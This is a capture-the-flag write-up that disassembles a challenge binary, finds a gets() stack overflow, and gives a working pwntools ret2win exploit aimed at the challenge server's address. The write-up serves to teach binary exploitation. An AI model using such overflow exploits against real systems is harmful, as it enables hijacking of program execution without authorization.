# Baby Armageddon - CTF Writeup

## Challenge Overview
**Category:** Binary Exploitation  

**Description:**
> There has been news of a new company called "Baby Armageddon Corp." and they seem to have the capabilities of destroying the entire world with one single attack on Earth. But there has been rumors that the company is ran by literal babies and they have really terrible security.
> Can you break through and obtain their Armageddon device through their QnA server?

## Initial Analysis

### Binary Information
```bash
$ file armageddon_device
armageddon_device: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=65caa23f951502d09b117e37fe9db7e4c8f57437, for GNU/Linux 3.2.0, not stripped
```

The binary is a 64-bit ELF executable that is not stripped, making our analysis easier since function names are preserved.

### Program Execution Flow

Running the binary locally:
```bash
$ ./armageddon_device 
What is your question?
test_input
Just kidding! We are not sending any information to you!
```

The program appears to ask for user input but then dismisses the user with a message, suggesting there might be a hidden functionality.

## Static Analysis

### Disassembly Analysis

Looking at the objdump output (command: "objdump -d armageddon_device"), we can identify three main functions:

1. **`main` function (0x4012e3):** Entry point that sets up stdio buffers and calls `question`
2. **`question` function (0x4012a5):** Handles user input and displays the dismissive message
3. **`armageddon` function (0x401216):** A hidden function that seems to be our target

### Function Analysis

#### Main Function (0x4012e3)
```assembly
4012e3: f3 0f 1e fa          endbr64
4012e7: 55                   push   %rbp
4012e8: 48 89 e5             mov    %rsp,%rbp
4012eb: 48 83 ec 10          sub    $0x10,%rsp
...
401332: b8 00 00 00 00       mov    $0x0,%eax
401337: e8 69 ff ff ff       call   4012a5 <question>
40133c: b8 00 00 00 00       mov    $0x0,%eax
401341: c9                   leave
401342: c3                   ret
```

The main function simply sets up stdio buffers (disabling buffering) and calls the `question` function.

#### Question Function (0x4012a5) - The Vulnerable Function
```assembly
4012a5: f3 0f 1e fa          endbr64
4012a9: 55                   push   %rbp
4012aa: 48 89 e5             mov    %rsp,%rbp
4012ad: 48 83 c4 80          add    $0xffffffffffffff80,%rsp  ; Allocate 128 bytes
4012b1: 48 8d 05 a8 0d 00 00 lea    0xda8(%rip),%rax
4012b8: 48 89 c7             mov    %rax,%rdi
4012bb: e8 f0 fd ff ff       call   4010b0 <puts@plt>        ; Print prompt
4012c0: 48 8d 45 80          lea    -0x80(%rbp),%rax         ; Buffer at rbp-0x80
4012c4: 48 89 c7             mov    %rax,%rdi
4012c7: b8 00 00 00 00       mov    $0x0,%eax
4012cc: e8 2f fe ff ff       call   401100 <gets@plt>        ; VULNERABLE: gets() call
4012d1: 48 8d 05 a0 0d 00 00 lea    0xda0(%rip),%rax
4012d8: 48 89 c7             mov    %rax,%rdi
4012db: e8 d0 fd ff ff       call   4010b0 <puts@plt>        ; Print dismissive message
```

**Key Observations:**
- Stack space allocated: 128 bytes (`0x80`)
- Buffer location: `rbp-0x80` (128 bytes from base pointer)
- **CRITICAL VULNERABILITY:** Uses `gets()` function which doesn't perform bounds checking

Bounds checking is the process of verifying that data being written or accessed stays within the valid memory boundaries of a buffer, array, or variable.

#### Armageddon Function (0x401216) - The Target
```assembly
401216: f3 0f 1e fa          endbr64
40121a: 55                   push   %rbp
40121b: 48 89 e5             mov    %rsp,%rbp
40121e: 48 83 ec 50          sub    $0x50,%rsp
401222: 48 8d 05 df 0d 00 00 lea    0xddf(%rip),%rax        ; Load "r" string
401229: 48 89 c6             mov    %rax,%rsi
40122c: 48 8d 05 d7 0d 00 00 lea    0xdd7(%rip),%rax        ; Load filename
401233: 48 89 c7             mov    %rax,%rdi
401236: e8 d5 fe ff ff       call   401110 <fopen@plt>      ; Open file
...
401287: 48 8d 05 9a 0d 00 00 lea    0xd9a(%rip),%rax        ; Format string
40128e: 48 89 c7             mov    %rax,%rdi
401291: b8 00 00 00 00       mov    $0x0,%eax
401296: e8 45 fe ff ff       call   4010e0 <printf@plt>     ; Print flag content
```

This function opens a file (likely containing the flag) and prints its contents. This is our target function that we need to redirect execution to.

## Vulnerability Analysis

### Buffer Overflow in `gets()`

The vulnerability lies in the `question` function's use of `gets()`:

1. **Buffer Size:** 128 bytes allocated on stack (`rbp-0x80`)
2. **Input Function:** `gets()` - notorious for not checking input length
3. **Memory Layout:**
   ```
   [128-byte buffer] [8-byte rbp] [8-byte return address]
   ```

### Calculating the Offset

To overwrite the return address, we need to:
1. Fill the 128-byte buffer
2. Overwrite the saved RBP (8 bytes)
3. Overwrite the return address (8 bytes)

**Total offset:** 128 + 8 = 136 bytes

## Exploitation

### Exploit Strategy

1. **Overflow the buffer** with 136 bytes of padding
2. **Overwrite the return address** with the address of `armageddon` function (0x401216)
3. **Redirect execution** to the hidden function that prints the flag

### Exploit Code

```python
# exploit.py
from pwn import *

# Connect to remote server
p = remote('152.42.220.146', 35176)

# Calculate offset to return address
offset = 136

# Create padding to reach return address
padding = b'A' * offset

# Address of armageddon function (little-endian format for x64)
armageddon_addr = p64(0x401216)

# Construct the payload
payload = padding + armageddon_addr

# Send the payload
log.info(f"Payload: {payload}")
p.sendline(payload)

# Get the flag
p.interactive()
```

### Payload Breakdown

```
Payload Structure:
[AAAAAAAA...] (136 bytes) + [0x0000000000401216] (8 bytes)
     ↑                              ↑
   Padding to reach              Address of armageddon
   return address                   function
```

### Why This Works

1. **Stack Frame Layout:** When `question` function is called, the stack looks like:
   ```
   High Address
   ┌─────────────────┐
   │ Return Address  │ ← We overwrite this
   ├─────────────────┤
   │ Saved RBP       │ ← We overwrite this too
   ├─────────────────┤
   │                 │
   │ 128-byte buffer │ ← gets() writes here
   │                 │
   └─────────────────┘
   Low Address
   ```

2. **Buffer Overflow:** `gets()` doesn't check boundaries, allowing us to write past the buffer
3. **Return Address Hijacking:** By overwriting the return address with `0x401216`, we redirect execution to the `armageddon` function
4. **Flag Retrieval:** The `armageddon` function reads and prints the flag file

## Security Implications

### Why `gets()` is Dangerous

1. **No Bounds Checking:** Cannot specify maximum input length
2. **Stack Corruption:** Easily leads to buffer overflows
3. **Code Execution:** Attackers can hijack program flow
4. **Deprecated Function:** Modern compilers warn against its use

### Modern Mitigations (Not Present)

This binary lacks several modern security features:
- **Stack Canaries:** Would detect stack corruption
- **ASLR:** Would randomize function addresses
- **NX Bit:** Would prevent code execution on stack
- **PIE:** Would randomize code section addresses

## Conclusion

The "Baby Armageddon" challenge demonstrates a classic buffer overflow vulnerability through the use of the dangerous `gets()` function. The exploit successfully:

1. Identified the vulnerable input function
2. Calculated the precise offset to the return address
3. Redirected program execution to a hidden function
4. Retrieved the flag from the target system

This challenge serves as an excellent introduction to binary exploitation, showing how poor input validation can lead to complete program control.

### Key Takeaways

- Always use safe input functions (`fgets()`, `scanf()` with length limits)
- Enable modern security features (stack canaries, ASLR, NX)
- Validate input lengths before processing
- Regular security audits can catch such vulnerabilities
